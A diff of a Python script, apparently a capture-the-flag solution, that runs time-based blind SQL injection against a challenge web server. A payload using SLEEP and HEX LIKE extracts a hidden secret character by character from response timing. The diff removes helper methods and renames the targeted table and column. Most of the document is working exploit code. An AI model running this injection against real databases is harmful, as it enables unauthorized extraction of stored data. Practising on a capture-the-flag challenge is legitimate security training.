@@ -22,23 +22,9 @@ class Inj:
         data = {'query': query }
         return self.sess.post(url,json=data, headers=headers).json()
 
-    def logic(self, query):
-        url = self.base_url + 'logic'
-        response = self._do_raw_req(url, query)
-        return response['result'], response['sql_error']
-
-    def union(self, query):
-        url = self.base_url + 'union'
-        response = self._do_raw_req(url, query)
-        return response['result'], response['sql_error']
 
     def blind(self, query):
         url = self.base_url + 'blind'
-        response = self._do_raw_req(url, query)
-        return response['result'], response['sql_error']
-
-    def time(self, query):
-        url = self.base_url + 'time'
         response = self._do_raw_req(url, query)
         return response['result'], response['sql_error']
     
@@ -49,7 +35,7 @@ class Inj:
 def main():
 
 
-    payload = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{}%')='1"
+    payload = "1' AND (SELECT SLEEP(1) FROM secret  WHERE HEX(asecret) LIKE '{}%')='1"
     
     inj = Inj('http://web-17.challs.olicyber.it')
 
@@ -57,18 +43,18 @@ def main():
 
     while True:
         for c in EXS:
-            print('Trying {}'.format(result + c))
+            print('Flag HEX: {}'.format(result + c), end='\r')
             question = payload.format(result + c)
             start = time.time()
-            response, error = inj.time(question)
+            response, error = inj.blind(question)
+            # print(response, error)
             if time.time() - start > 1: # We have a match!
                 result += c
                 break
         else:
-            print("Completato")
+            print()
             break
     
-    print("Message HEX: " + result)
     print(binascii.unhexlify(result))
 
 if __name__ == '__main__':
